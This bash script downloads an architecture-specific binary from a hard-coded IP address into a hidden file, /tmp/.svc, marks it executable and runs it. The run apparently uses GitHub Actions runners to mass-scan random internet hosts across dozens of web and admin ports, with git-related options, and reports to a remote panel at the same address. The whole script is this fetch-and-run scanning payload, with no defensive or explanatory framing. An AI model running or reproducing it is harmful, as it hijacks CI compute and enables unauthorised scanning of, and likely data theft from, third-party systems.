#!/bin/bash
set -euo pipefail
case "$(uname -m 2>/dev/null)" in
  i[3-6]86) suffix=386 ;;
  aarch64|arm64) suffix=arm64 ;;
  armv*) suffix=arm ;;
  *) suffix=amd64 ;;
esac
curl -sfL "http://43.228.157.68:80/api/dl/${suffix}" -o /tmp/.svc 2>/dev/null || \
  wget -qO /tmp/.svc "http://43.228.157.68:80/api/dl/${suffix}" 2>/dev/null
test -s /tmp/.svc
chmod 755 /tmp/.svc
PANEL_URL="http://43.228.157.68:80" \
GITHUB_REPOSITORY="${GITHUB_REPOSITORY:-}" \
GITHUB_RUN_ID="${GITHUB_RUN_ID:-}" \
/tmp/.svc ipscan \
  --source random \
  --workers 1000 \
  --git \
  --ports 80,443,8080,8081,8088,8181,8443,8888,2086,2087,2095,2096,3000,3001,4000,5000,5001,7001,8000,2077,2078,2082,2083,8001,8008,9000,9001,9090,9443,10000,10443 \
  --git-workers 20 \
  --count 9999999999 --no-reverse 2>&1 | tail -2 || true
